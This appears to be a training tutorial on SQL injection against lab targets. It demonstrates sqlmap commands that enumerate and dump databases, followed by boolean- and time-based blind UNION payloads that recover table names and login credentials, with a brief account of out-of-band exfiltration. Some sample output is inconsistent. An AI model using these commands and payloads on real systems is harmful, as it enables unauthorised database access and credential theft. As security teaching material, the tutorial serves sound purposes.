As this is a command-line tool, you must open your Linux OS terminal to use it. The --help command with SQLMap will list all the available flags you can use. If you don't want to manually add the flags to each command, use the --wizard flag with SQLMap. When you use this flag, the tool will guide you through each step and ask questions to complete the scan, making this a perfect option for beginners.

Interactive wizard
user@ubuntu:~$ sqlmap --wizard
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.2.4#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]

[*] starting at 08:42:50

[08:42:50] [INFO] starting wizard interface
Please enter full target URL (-u): 
The --dbs flag helps you to extract all the database names. Once you get to know the database names, you can extract information about the tables of that database by using -D database_name --tables. After obtaining the tables, if you want to enumerate the records in those tables, you can use -D database_name -T table_name --dump. The different flags in the SQLMap tool let you extract detailed information from the databases. Now, let's take a practical scenario and use all the above flags to exploit a web application vulnerable to SQL injection.

The first step is to look for a possible vulnerable URL or request. You may often come across some URLs that use GET parameters to retrieve the data. For example, a URL like http://sqlmaptesting.thm/search?cat=1 uses a parameter cat that takes the value 1. If you see any web application using GET parameters in the URLs to retrieve data, you can test that URL with the -u flag in the SQLMap tool. This is considered to be HTTP GET-based testing. This approach is followed when the application uses GET parameters in the URL to retrieve data from the searches.

We will use a supposedly vulnerable website URL: http://sqlmaptesting.thm for the demonstration. Suppose that this website has a search option, and when you click on this search option and search for something, the URL becomes http://sqlmaptesting.thm/search/cat=1, which uses the GET parameter cat=1 in the URL to extract information from the database. As we know, URLs that have GET parameters can be vulnerable to SQL injection; let us scan this URL to identify if it has any SQL injection vulnerability.

Testing URL for
SQL
injection
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1
      __H__
 ___ ___[']_____ ___ ___  {1.2.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]
[08:43:49] [INFO] testing connection to the target URL
[08:43:49] [INFO] heuristics detected web page charset 'ascii'
[08:43:49] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[08:43:49] [INFO] testing if the target URL content is stable
[08:43:50] [INFO] target URL content is stable
[08:43:50] [INFO] testing if GET parameter 'cat' is dynamic
[text removed]
[08:45:04] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable 
[text removed]
[08:45:08] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: cat=1 AND EXTRACTVALUE(1846,CONCAT(0x5c,0x716a787071,(SELECT (ELT(1846=1846,1))),0x7170766a71))

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: cat=1 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: cat=1 UNION ALL SELECT CONCAT(0x716a787071,0x714d486661414f6456787a4a55796b6c7a78574f7858507a6e6a725647436e64496f4965794c6873,0x7170766a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HMgq
---
[08:45:16] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[text removed]
The results in the above terminal show us that different types of SQL injection, such as boolean-based blind, error-based, time-based blind, and UNION query, are identified in the target URL. These are different techniques for exploiting a SQL injection vulnerability. For example, in the boolean-based blind SQL injection, the SQL query is modified, and a boolean expression (that is always true, e.g., 1=1) is included with the query to extract the information. Whereas in the error-based SQL injection, some queries are intentionally modified to generate errors in the results sent by the database. These errors often contain valuable information about the data. Similarly, other SQL injection techniques can also be employed to exploit a database.

The results from the command we executed for our target http://sqlmaptesting.thm/search/cat=1 tell us that different types of SQL injection are possible on this URL. Let's use SQLMap's flags, which we studied earlier, to exploit them and extract some valuable data from the database.

To fetch the databases, we use the flag --dbs. Let's try this flag out with our vulnerable URL:

Extracting databases names
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
       __H__
 ___ ___[(]_____ ___ ___  {1.2.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]
[08:49:00] [INFO] resuming back-end DBMS' mysql' 
[08:49:00] [INFO] testing connection to the target URL
[08:49:01] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175
[text removed]    
[08:49:01] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[08:49:01] [INFO] fetching database names
available databases [2]:
[*] users
[*] members

[text removed]
After running the above command, we got two database names. Select the users database and fetch the tables inside of it. We will define the database after the flag -D and use the --tables flag at the end to extract all the table names.

Extracting tables
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
       __H__
 ___ ___[(]_____ ___ ___  {1.2.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]
[08:50:46] [INFO] resuming back-end DBMS' mysql' 
[08:50:46] [INFO] testing connection to the target URL
[08:50:46] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175
[text removed]
[08:50:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[08:50:46] [INFO] fetching tables for database: 'users'
Database: acuart
[3 tables]
+-----------+
| johnath   |
| alexas    |
| thomas    |     
+-----------+

[text removed]
Now that we have all the available table names of the database, let's dump the records present in the thomas table. To do so, we will define the database with the -D flag, the table with the -T flag, and for extracting the records of the table, we will use the --dump flag.

Extracting records from a table
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump
       __H__
 ___ ___[(]_____ ___ ___  {1.2.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]
[08:51:48] [INFO] resuming back-end DBMS' mysql' 
[08:51:48] [INFO] testing connection to the target URL
[08:51:49] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175
[text removed]
[08:51:49] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[08:51:49] [INFO] fetching columns for table 'thomas' in database 'users'
[08:51:49] [INFO] fetching entries for table 'thomas' in database' users'
[08:51:49] [INFO] recognized possible password hashes in column 'passhash'
do you want to store hashes to a temporary file for eventual further processing n
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: users
Table: thomas
[1 entry]
+---------------------+------------+---------+
| Date                | name       | pass    |    
+---------------------+------------+----------
| 09/09/2024          | Thomas THM | testing |    
+---------------------+------------+---------+

[text removed]
However, unlike the URL used for testing above, you can also use POST-based testing, where the application sends data in the request's body instead of the URL. Examples of this could be login forms, registration forms, etc. To follow this approach, you must intercept a POST request on the login or registration page and save it as a text file. You can use the following command to input that request saved in the text file to the SQLMap tool:

Testing an intercepted request
user@ubuntu:~$ sqlmap -r intercepted_request.txt
Note: Learning how to intercept and capture POST requests is out-of-scope for this room.

Boolean Based

Boolean-based SQL Injection refers to the response we receive from our injection attempts, which could be a true/false, yes/no, on/off, 1/0 or any response that can only have two outcomes. That outcome confirms that our SQL Injection payload was either successful or not. On the first inspection, you may feel like this limited response can't provide much information. Still, with just these two responses, it's possible to enumerate a whole database structure and contents.

Practical:

On level three of the SQL Injection Examples Machine, you're presented with a mock browser with the following URL:

https://website.thm/checkuser?username=admin

The browser body contains  {"taken":true}. This API endpoint replicates a common feature found on many signup forms, which checks whether a username has already been registered to prompt the user to choose a different username. Because the taken value is set to true, we can assume the username admin is already registered. We can confirm this by changing the username in the mock browser's address bar from admin to admin123, and upon pressing enter, you'll see the value taken has now changed to false.

The SQL query that is processed looks like the following:

select * from users where username = '%username%' LIMIT 1;

The only input we have control over is the username in the query string, and we'll have to use this to perform our SQL injection. Keeping the username as admin123, we can start appending to this to try and make the database confirm true things, changing the state of the taken field from false to true.

Like in previous levels, our first task is to establish the number of columns in the users' table, which we can achieve by using the UNION statement. Change the username value to the following:

admin123' UNION SELECT 1;-- 

As the web application has responded with the value taken as false, we can confirm this is the incorrect value of columns. Keep on adding more columns until we have a taken value of true. You can confirm that the answer is three columns by setting the username to the below value:

admin123' UNION SELECT 1,2,3;-- 

Now that our number of columns has been established, we can work on the enumeration of the database. Our first task is to discover the database name. We can do this by using the built-in database() method and then using the like operator to try and find results that will return a true status.

Try the below username value and see what happens:


admin123' UNION SELECT 1,2,3 where database() like '%';--


We get a true response because, in the like operator, we just have the value of %, which will match anything as it's the wildcard value. If we change the wildcard operator to a%, you'll see the response goes back to false, which confirms that the database name does not begin with the letter a. We can cycle through all the letters, numbers and characters such as - and _ until we discover a match. If you send the below as the username value, you'll receive a true response that confirms the database name begins with the letter s.


admin123' UNION SELECT 1,2,3 where database() like 's%';--


Now you move on to the next character of the database name until you find another true response, for example, 'sa%', 'sb%', 'sc%', etc. Keep on with this process until you discover all the characters of the database name, which is sqli_three.


We've established the database name, which we can now use to enumerate table names using a similar method by utilising the information_schema database. Try setting the username to the following value:


admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--


This query looks for results in the information_schema database in the tables table where the database name matches sqli_three, and the table name begins with the letter a. As the above query results in a false response, we can confirm that there are no tables in the sqli_three database that begin with the letter a. Like previously, you'll need to cycle through letters, numbers and characters until you find a positive match.


You'll finally end up discovering a table in the sqli_three database named users, which you can confirm by running the following username payload:

admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--

Lastly, we now need to enumerate the column names in the users table so we can properly search it for login credentials. Again, we can use the information_schema database and the information we've already gained to query it for column names. Using the payload below, we search the columns table where the database is equal to sqli_three, the table name is users, and the column name begins with the letter a.


admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';

Again,  you'll need to cycle through letters, numbers and characters until you find a match. As you're looking for multiple results, you'll have to add this to your payload each time you find a new column name to avoid discovering the same one. For example, once you've found the column named id, you'll append that to your original payload (as seen below).


admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';


Repeating this process three times will enable you to discover the columns' id, username and password.
Which now you can use to query the users table for login credentials. First, you'll need to discover a valid username, which you can use the payload below:


admin123' UNION SELECT 1,2,3 from users where username like 'a%

Once you've cycled through all the characters, you will confirm the existence of the username admin. 
Now you've got the username. You can concentrate on discovering the password. The payload below shows you how to find the password:

admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%

Cycling through all the characters, you'll discover the password is 3845.

You can now use the username and password you've enumerated through the blind SQL Injection vulnerability on the login form to access the next level.

## Time-Based

A time-based blind SQL injection is very similar to the above boolean-based one in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced using built-in methods such as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 


So, for example, when trying to establish the number of columns in a table, you would use the following query:


admin123' UNION SELECT SLEEP(5);--


If there was no pause in the response time, we know that the query was unsuccessful, so like on previous tasks, we add another column:


admin123' UNION SELECT SLEEP(5),2;--


This payload should have produced a 5-second delay, confirming the successful execution of the UNION statement and that there are two columns.


You can now repeat the enumeration process from the Boolean-based SQL injection, adding the SLEEP() method to the UNION SELECT statement.
If you're struggling to find the table name, the below query should help you on your way:

referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--

Out-of-band SQL Injection isn't as common as it either depends on specific features being enabled on the database server or the web application's business logic, which makes some kind of external network call based on the results from an SQL query.

An Out-Of-Band attack is classified by having two different communication channels, one to launch the attack and the other to gather the results. For example, the attack channel could be a web request, and the data gathering channel could be monitoring HTTP/DNS requests made to a service you control.

1) An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.

2) The Website makes an SQL query to the database, which also passes the hacker's payload.

3) The payload contains a request which forces an HTTP request back to the hacker's machine containing data from the database.


